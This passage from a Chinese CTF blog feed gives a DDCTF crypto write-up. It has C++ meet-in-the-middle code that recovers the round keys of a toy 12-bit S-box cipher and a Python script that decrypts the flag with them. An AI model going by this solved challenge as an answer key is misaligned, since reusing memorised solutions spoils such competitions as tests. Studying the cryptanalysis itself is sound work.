的密钥，但是空间还是很大，没办法爆破。<br>这里可以用 MITM，保存 4096 * 4096 个状态，将爆破空间降到 4096^3，用 cpp 写了下，速度还是挺快的，几分钟能跑完，<br>选取给的 plaintext 和 ciphertext 的第一个 bits 来爆破，然后用后面的 3 个来验证下是否正确</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//int sbox0[] = 太长不复制了</span></span><br><span class="line"><span class="comment">//int sbox1[] =</span></span><br><span class="line"><span class="comment">//int rsbox0[] =</span></span><br><span class="line"><span class="comment">//int rsbox1[] =</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> NUM_BITS = <span class="number">12</span>;</span><br><span class="line"><span class="keyword">int</span> MAX_VALUE = (<span class="number">2</span> &lt;&lt; (NUM_BITS - <span class="number">1</span>));</span><br><span class="line"><span class="keyword">int</span> BIT_MASK = MAX_VALUE - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rol7</span><span class="params">(<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((((b) &lt;&lt; <span class="number">7</span>) &amp; BIT_MASK) | (((b) &amp; BIT_MASK) &gt;&gt; (NUM_BITS - <span class="number">7</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ror7</span><span class="params">(<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((((b) &amp; BIT_MASK) &gt;&gt; <span class="number">7</span>) | (((b) &lt;&lt; (NUM_BITS - <span class="number">7</span>)) &amp; BIT_MASK));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt_block</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> k3, <span class="keyword">int</span> k4)</span> </span>&#123;</span><br><span class="line">    i = sbox0[sbox1[sbox0[(i &amp; BIT_MASK) ^ k0] ^ k1] ^ k2] ^ k3;</span><br><span class="line">    <span class="keyword">return</span> (ror7(i) ^ k4) &amp; BIT_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">encrypt_block_simple</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> kf)</span> </span>&#123;</span><br><span class="line">    i = sbox0[sbox1[sbox0[(i &amp; BIT_MASK) ^ k0] ^ k1] ^ k2];</span><br><span class="line">    i = i ^ kf;</span><br><span class="line">    <span class="keyword">return</span> (ror7(i)) &amp; BIT_MASK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decrypt_block</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> k3, <span class="keyword">int</span> k4)</span> </span>&#123;</span><br><span class="line">    i = rol7((i &amp; BIT_MASK) ^ k4) ^ k3;</span><br><span class="line">    <span class="keyword">return</span> (rsbox0[rsbox1[rsbox0[i] ^ k2] ^ k1] ^ k0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">decrypt_block_simple</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> k0, <span class="keyword">int</span> k1, <span class="keyword">int</span> k2, <span class="keyword">int</span> kf)</span> </span>&#123;</span><br><span class="line">    i = rol7((i &amp; BIT_MASK)) ^ kf;</span><br><span class="line">    <span class="keyword">return</span> (rsbox0[rsbox1[rsbox0[i] ^ k2] ^ k1] ^ k0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">merge_two</span><span class="params">(<span class="keyword">int</span> n1, <span class="keyword">int</span> n2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (n1 &lt;&lt; <span class="number">12</span>) | n2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; split_two(<span class="keyword">int</span> n) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::make_pair(n &gt;&gt; <span class="number">12</span>, n &amp; BIT_MASK);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1092 -&gt; 2285</span></span><br><span class="line"><span class="comment">// k0, k1, k2, (k3 ^ k4) -&gt; kf</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; mid_status;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt; keys;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4096</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        tmp.reserve(<span class="number">4096</span>);</span><br><span class="line">        mid_status[i] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> plain = <span class="number">1079</span>;</span><br><span class="line">    <span class="keyword">int</span> cipher = <span class="number">567</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k0 = <span class="number">0</span>; k0 &lt; <span class="number">4096</span>; k0++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k1 = <span class="number">0</span>; k1 &lt; <span class="number">4096</span>; k1++) &#123;</span><br><span class="line">            <span class="keyword">int</span> merge = merge_two(k0, k1);</span><br><span class="line">            <span class="keyword">int</span> mid = sbox1[sbox0[plain ^ k0] ^ k1];</span><br><span class="line">            mid_status[mid].push_back(merge);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k2 = <span class="number">0</span>; k2 &lt; <span class="number">4096</span>; k2++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> kf = <span class="number">0</span>; kf &lt; <span class="number">4096</span>; kf++) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = rol7(cipher);</span><br><span class="line">            mid = mid ^ kf;</span><br><span class="line">            mid = rsbox0[mid];</span><br><span class="line">            mid = mid ^ k2;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> &amp;tgt : mid_status[mid]) &#123;</span><br><span class="line">                <span class="keyword">auto</span> splited = split_two(tgt);</span><br><span class="line">                <span class="keyword">int</span> k0 = splited.first;</span><br><span class="line">                <span class="keyword">int</span> k1 = splited.second;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (encrypt_block_simple(<span class="number">1079</span>, k0, k1, k2, kf) == <span class="number">567</span> &amp;&amp;</span><br><span class="line">                    encrypt_block_simple(<span class="number">633</span>, k0, k1, k2, kf) == <span class="number">361</span> &amp;&amp;</span><br><span class="line">                        encrypt_block_simple(<span class="number">1799</span>, k0, k1, k2, kf) == <span class="number">1793</span> &amp;&amp;</span><br><span class="line">                        encrypt_block_simple(<span class="number">1121</span>, k0, k1, k2, kf) == <span class="number">1001</span>) &#123;</span><br><span class="line">                    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; k0 &lt;&lt; <span class="string">" "</span> &lt;&lt; k1 &lt;&lt; <span class="string">" "</span> &lt;&lt; k2 &lt;&lt; <span class="string">" "</span> &lt;&lt; kf &lt;&lt; <span class="string">" "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后得到两个结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3488 2863 726 1886</span><br><span class="line">934 1050 1509 3200</span><br></pre></td></tr></table></figure><p>改下脚本用合并的轮密钥来解密，第一行那四个就是正确的密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define constant properties</span></span><br><span class="line">SECRET_KEYS = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]  <span class="comment"># DUMMY</span></span><br><span class="line">NUM_BITS = <span class="number">12</span></span><br><span class="line">BLOCK_SIZE_BITS = <span class="number">48</span></span><br><span class="line">BLOCK_SIZE = BLOCK_SIZE_BITS / <span class="number">8</span></span><br><span class="line">MAX_VALUE = (<span class="number">2</span> &lt;&lt; (NUM_BITS - <span class="number">1</span>))</span><br><span class="line">BIT_MASK = MAX_VALUE - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cipher</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, k0, k1, k2, kf)</span>:</span></span><br><span class="line">        self.k0 = k0</span><br><span class="line">        self.k1 = k1</span><br><span class="line">        self.k2 = k2</span><br><span class="line">        self.kf = kf</span><br><span class="line"></span><br><span class="line">        self._rand_start = <span class="number">0</span></span><br><span class="line">        self.sbox0, self.rsbox0 = self.generate_boxes(<span class="number">106</span>)</span><br><span class="line">        self.sbox1, self.rsbox1 = self.generate_boxes(<span class="number">81</span>)</span><br><span class="line">        <span class="keyword">print</span> self.sbox0</span><br><span class="line">        <span class="keyword">print</span> self.sbox1</span><br><span class="line">        <span class="keyword">print</span> self.rsbox0</span><br><span class="line">        <span class="keyword">print</span> self.rsbox1</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_srand</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self._rand_start = seed</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_rand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self._rand_start == <span class="number">0</span>:</span><br><span class="line">            self._rand_start = <span class="number">123459876</span></span><br><span class="line">        hi = self._rand_start / <span class="number">127773</span></span><br><span class="line">        lo = self._rand_start % <span class="number">127773</span></span><br><span class="line">        x = <span class="number">16807</span> * lo - <span class="number">2836</span> * hi</span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line">            x += <span class="number">0x7fffffff</span></span><br><span class="line">        self._rand_start = (x % (<span class="number">0x7fffffff</span> + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> self._rand_start</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_boxes</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.my_srand(seed)</span><br><span class="line">        sbox = range(MAX_VALUE)</span><br><span class="line">        rsbox = range(MAX_VALUE)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(MAX_VALUE):</span><br><span class="line">            r = self.my_rand() % MAX_VALUE</span><br><span class="line">            temp = sbox[i]</span><br><span class="line">            sbox[i] = sbox[r]</span><br><span class="line">            sbox[r] = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(MAX_VALUE):</span><br><span class="line">            rsbox[sbox[i]] = i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sbox, rsbox</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ror7</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ((((b) &amp; BIT_MASK) &gt;&gt; <span class="number">7</span>) | (((b) &lt;&lt; (NUM_BITS - <span class="number">7</span>)) &amp; BIT_MASK))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rol7</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> ((((b) &lt;&lt; <span class="number">7</span>) &amp; BIT_MASK) | (((b) &amp; BIT_MASK) &gt;&gt; (NUM_BITS - <span class="number">7</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pad_string</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        num_blocks = len(s) / BLOCK_SIZE</span><br><span class="line">        num_remainder = len(s) % BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">        pad = (BLOCK_SIZE - num_remainder) % BLOCK_SIZE</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(BLOCK_SIZE - num_remainder):</span><br><span class="line">            s += chr(pad)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unpad_string</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        pad = ord(s[<span class="number">-1</span>]) &amp; <span class="number">0xff</span></span><br><span class="line">        <span class="keyword">if</span> pad == <span class="number">0</span> <span class="keyword">or</span> pad &gt; BLOCK_SIZE:</span><br><span class="line">            pad = BLOCK_SIZE</span><br><span class="line">        <span class="keyword">return</span> s[:-pad]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">string_to_bits_list</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        input_chars = s</span><br><span class="line">        num_blocks = len(s) / BLOCK_SIZE</span><br><span class="line"></span><br><span class="line">        bits_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(num_blocks):</span><br><span class="line">            block = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(BLOCK_SIZE):</span><br><span class="line">                block = block &lt;&lt; <span class="number">8</span></span><br><span class="line">                block = block | ord(input_chars[i * BLOCK_SIZE + j])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(BLOCK_SIZE_BITS, <span class="number">0</span>, -NUM_BITS):</span><br><span class="line">                bits_list.append((block &gt;&gt; (j - NUM_BITS)) &amp; BIT_MASK)</span><br><span class="line">        <span class="keyword">return</span> bits_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bits_list_to_string</span><span class="params">(self, input_bits)</span>:</span></span><br><span class="line">        num_input_bits_per_block = BLOCK_SIZE_BITS / NUM_BITS;</span><br><span class="line">        output_chars = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(input_bits), num_input_bits_per_block):</span><br><span class="line">            block = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(num_input_bits_per_block):</span><br><span class="line">                block = block &lt;&lt; NUM_BITS</span><br><span class="line">                block = block | (input_bits[i + j])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> xrange(BLOCK_SIZE, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">                output_chars.append((block &gt;&gt; ((j - <span class="number">1</span>) * <span class="number">8</span>)) &amp; <span class="number">0xff</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>.join([chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> output_chars])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt_bits</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        boxed = self.sbox0[self.sbox1[self.sbox0[(b &amp; BIT_MASK) ^ self.k0] ^ self.k1] ^ self.k2] ^ self.kf</span><br><span class="line">        <span class="keyword">return</span> (self.ror7(boxed)) &amp; BIT_MASK;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt_bits</span><span class="params">(self, b)</span>:</span></span><br><span class="line">        unboxed = self.rol7((b &amp; BIT_MASK)) ^ self.kf</span><br><span class="line">        <span class="keyword">return</span> (self.rsbox0[self.rsbox1[self.rsbox0[unboxed] ^ self.k2] ^ self.k1] ^ self.k0);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        pad_s = self.pad_string(s)</span><br><span class="line">        bits = self.string_to_bits_list(pad_s)</span><br><span class="line">        <span class="keyword">return</span> self.bits_list_to_string([(self.encrypt_bits(b)) <span class="keyword">for</span> b <span class="keyword">in</span> bits])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        bits = self.string_to_bits_list(s)</span><br><span class="line">        dec = [self.decrypt_bits(b) <span class="keyword">for</span> b <span class="keyword">in</span> bits]</span><br><span class="line">        <span class="keyword">return</span> self.unpad_string(self.bits_list_to_string(dec))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    DIFFERENTECH Cipher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    As you are monitoring your station, you intercepted a hex-encoded encrypted</span></span><br><span class="line"><span class="string">    message, along with its plain text.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    plaintext = "Cryptanalysis has coevolved together with cryptography"</span></span><br><span class="line"><span class="string">    ciphertext = ("2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049"</span></span><br><span class="line"><span class="string">                  "8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d"</span></span><br><span class="line"><span class="string">                  "146146146146").decode('hex')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    You have also previously chanced upon another encrypted message, which you</span></span><br><span class="line"><span class="string">    will need to decrypt.  Taking a look at the algorithm, and past interceptions,</span></span><br><span class="line"><span class="string">    you noticed that the 12-bit numbers:</span></span><br><span class="line"><span class="string">        2684 encrypts to 2568</span></span><br><span class="line"><span class="string">        3599 encrypts to 3185</span></span><br><span class="line"><span class="string">    You realize that you just might be able to break it before lunch!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    NOTE: GIVE ONE ENCRYPTED FLAG AS PART OF THE QUESTIION AND Try to decrypt</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># find the right SECRET_KEYS</span></span><br><span class="line">    SECRET_KEYS = [<span class="number">3488</span>, <span class="number">2863</span>, <span class="number">726</span>, <span class="number">1886</span>]</span><br><span class="line">    cipher = Cipher(*SECRET_KEYS)</span><br><span class="line"></span><br><span class="line">    test_text = <span class="string">"DDCTF&#123;"</span></span><br><span class="line">    ciphertext = (<span class="string">"8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf"</span>).decode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="comment">#test_text = "Cryptanalysis has coevolved together with cryptography"</span></span><br><span class="line">    <span class="comment">#ciphertext = ("2371697013e9bdcb50133102f2c8c08a69b93e1878ac7939ac7049"</span></span><br><span class="line">    <span class="comment">#              "8ddd5dee019f4be4ec8dd3a612c8708a1169701d5d3de3169c7b1d"</span></span><br><span class="line">    <span class="comment">#              "146146146146").decode('hex')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'==='</span></span><br><span class="line">    bits = cipher.string_to_bits_list(test_text)</span><br><span class="line">    <span class="keyword">print</span> len(bits)</span><br><span class="line">    <span class="keyword">print</span> bits</span><br><span class="line">    <span class="comment"># print cipher.encrypt_bits(1344)</span></span><br><span class="line">    <span class="comment"># print ciphertext</span></span><br><span class="line">    bits = cipher.string_to_bits_list(ciphertext)</span><br><span class="line">    <span class="keyword">print</span> bits</span><br><span class="line"></span><br><span class="line">    dec = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> bits:</span><br><span class="line">        dec.append(cipher.decrypt_bits(i))</span><br><span class="line">    <span class="keyword">print</span> dec</span><br><span class="line">    <span class="keyword">print</span> cipher.bits_list_to_string(dec)</span><br><span class="line">    <span class="keyword">print</span> len(bits)</span><br><span class="line">    <span class="comment"># 8ed251b186927f62521fa81348782ecd781957571b69749b3e1515901e4e7065a6e949174472fdf01dcf</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># enc = cipher.encrypt(test_text)</span></span><br><span class="line">    dec = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> test_text == dec:</span><br><span class="line">        print(<span class="string">"That's right!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Try again!"</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今年改了赛制, 可以两人组队, 我觉得改的还是不错的, 终于不用现场表演学习逆向和 pwn 了, 成功和 Ary 师傅打到了第三 233&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="ddctf" scheme="https://rmb122.com/tags/ddctf/"/>
    
  </entry>
  
  <entry>
    <title>TCTF/0CTF 2020 Writeup</title>
    <link href="https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/"/>
    <id>https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/</id>
    <published>2020-06-29T11:49:05.000Z</published>
    <updated>2020-07-02T08:07:47.301Z</updated>
    
